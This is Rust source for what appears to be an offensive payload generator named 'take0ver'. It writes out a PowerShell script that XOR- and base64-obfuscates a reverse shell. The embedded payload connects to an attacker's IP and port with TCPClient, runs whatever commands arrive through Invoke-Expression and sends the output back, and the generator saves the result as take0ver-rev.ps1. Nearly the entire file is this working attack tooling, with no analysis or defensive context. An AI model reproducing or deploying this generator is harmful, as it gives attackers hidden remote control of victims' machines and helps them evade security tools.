//! Generates your payloads :)

// External Libraries
use base64::{engine::general_purpose, Engine as _};
use colored::*;

// Standard Libraries
use std::fs;
use std::path::PathBuf;

// Everything below is the payload generator
pub fn generate(host: String, port: String) {
    // Payload template
    // START //
    let file = r#"function x($b, $s) {
    $newBytes = @();
    for ($i = 0; $i -lt $b.Count; $i++) {
        $newBytes += $b[$i] -bxor $s[$i % $s.Length];
    } 
    return $newBytes;
}
$_k = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDhmMGI4M2JmZGNkNTk3ZTRhNGEwYjMyMjJiNWZlMzY=")); 
$_i = "<B64-REPLACE>";
$_ix = x ([system.Text.Encoding]::UTF8.getBytes($_i)) $_k;
$_dix = x $_ix $_k;
$_dfix = [system.Text.Encoding]::UTF8.getString($_dix);
$_bd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_dfix));
Invoke-Expression $_bd
$_r = 121,86,16,95,9,93,30,53,3,6,49,1,68,76,82,22,64,65,25,52,67,7,113,83,65,91,1,101,7,23,64,95,94,95,70,23,10,76,71,18,21,94,76,75,69,88,68,17,81,3,93,15,30,1,92,95,29,64,3,66,73,45,125,65,89,11,0,65,7,31,19,30,70,55,6,8,80,90,67,72,123,3,94,4,83,22,19,31,119,74,18,84,8,1,19,117,95,86,18,85,12,76
$_dx = x $_r $_k;
$_gx0 = [system.Text.Encoding]::UTF8.getString($_dx)
$_rse =  x ([system.Text.Encoding]::UTF8.getBytes($_rs)) $_k;
$_rsp = $_rse -join ','
$_s1 = Invoke-Expression $_gx0
$_s2 = -join($_s1, $_rsp)
Invoke-Expression $_s2
$_dx3e = x $_exc $_k
$_dx3d = [system.Text.Encoding]::UTF8.getString($_dx3e);
 
Invoke-Expression $_dx3d"#;

    let payload = r#"$_rs = @'
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>', <ATTACKER-PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
'@;"#;
    // END //

    // Inserts the attacker ip and port into the payload
    let payload = &payload.replace("<ATTACKER-IP>", &host);
    let payload = &payload.replace("<ATTACKER-PORT>", &port);

    // Base 64 encodes the payload
    let payload = &general_purpose::STANDARD.encode(payload);
    // Inserts the base 64 encoded payload into the file
    let new_payload = file.replace("<B64-REPLACE>", payload);

    // Calls write(payload_as_string)
    write(new_payload);
}

// Writes to new payload
fn write(payload: String) {
    println!("{}", "Generating payload...".green().bold());
    let path = "./take0ver-rev.ps1";
    // Get full path of the ps1 payload file
    let full_path = PathBuf::from(path);
    // Write to the file
    fs::write(full_path.clone(), payload).expect("Unable to write file");
    // Get full path to payload
    let canonicalize = fs::canonicalize(full_path)
        .unwrap()
        .into_os_string()
        .into_string()
        .unwrap();
    println!(
        "{} \"{}\"",
        "Generated payload at".green().bold(),
        canonicalize.blue().bold()
    );
}
